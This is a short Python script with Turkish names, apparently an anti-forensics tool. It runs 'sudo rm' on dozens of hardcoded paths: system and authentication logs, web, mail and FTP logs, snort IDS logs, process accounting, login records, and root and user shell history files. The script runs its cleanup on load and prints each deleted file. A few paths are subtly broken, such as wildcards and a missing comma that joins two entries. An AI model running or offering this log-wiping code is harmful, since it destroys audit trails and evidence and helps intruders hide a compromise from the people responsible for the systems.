import os;

def log_silme():
	print("")
	dosyalar=["/var/log/lastlog", 
            "/var/log/messages", 
            "/var/log/warn", 
            "/var/log/wtmp", 
            "/var/log/poplog", 
            "/var/log/qmail", 
            "/var/log/smtpd", 
            "/var/log/telnetd", 
            "/var/log/secure", 
            "/var/log/auth", 
            "/var/log/auth.log", 
            "/var/log/cups/access_log", 
            "/var/log/kern.log",
            "/var/log/cups/error_log", 
            "/var/log/thttpd_log", 
            "/var/log/spooler", 
            "/var/spool/tmp", 
            "/var/spool/errors", 
            "/var/spool/locks", 
            "/var/log/nctfpd.errs", 
            "/var/log/acct", 
            "/var/log/apache2/*", 
            "/var/log/apache2/*", 
            "/usr/local/apache/*", 
            "/usr/local/apache/*", 
            "/usr/local/www/logs/thttpd_log", 
            "/var/log/news", 
            "/var/log/news/news", 
            "/var/log/news.all", 
            "/var/log/news/news.all", 
            "/var/log/news/news.crit", 
            "/var/log/news/news.err", 
            "/var/log/news/news.notice", 
            "/var/log/news/suck.err", 
            "/var/log/news/suck.notice", 
            "/var/log/xferlog", 
            "/var/log/proftpd/xferlog.legacy", 
            "/var/log/proftpd.xferlog", 
            "/var/log/proftpd.access_log", 
            "/var/log/httpd/error_log", 
            "/var/log/httpsd/ssl_log", 
            "/var/log/httpsd/ssl.access_log", 
            "/var/adm", 
            "/var/run/utmp", 
            "/etc/wtmp", 
            "/etc/utmp", 
            "/etc/mail/access", 
            "/var/log/mail/info.log", 
            "/var/log/mail/errors.log", 
            "/var/log/httpd/*_log", 
            "/var/log/ncftpd/misclog.txt", 
            "/var/account/pacct", 
            "/var/log/snort", 
            "/var/log/bandwidth", 
            "/var/log/explanations", 
            "/var/log/syslog", 
            "/var/log/user.log", 
            "/var/log/daemons/info.log", 
            "/var/log/daemons/warnings.log", 
            "/var/log/daemons/errors.log", 
            "/etc/httpd/logs/error_log", 
            "/etc/httpd/logs/*_log", 
            "/var/log/mysqld/mysqld.log"
            "/root/.ksh_history", 
            "/root/.bash_history",
            "/home/*/.bash_history", 
            "/root/.sh_history", 
            "/root/.history", 
            "/root/*_history", 
            "/root/.login", 
            "/root/.logout", 
            "/root/.bash_logut", 
            "/root/.Xauthority"]

	for dosya in dosyalar:
		if os.path.isfile(dosya):
			os.system("sudo rm "+dosya)
			print("Silindi--------> "+dosya)
	print("")
	print("Tamamlandı")
	print("")


log_silme()
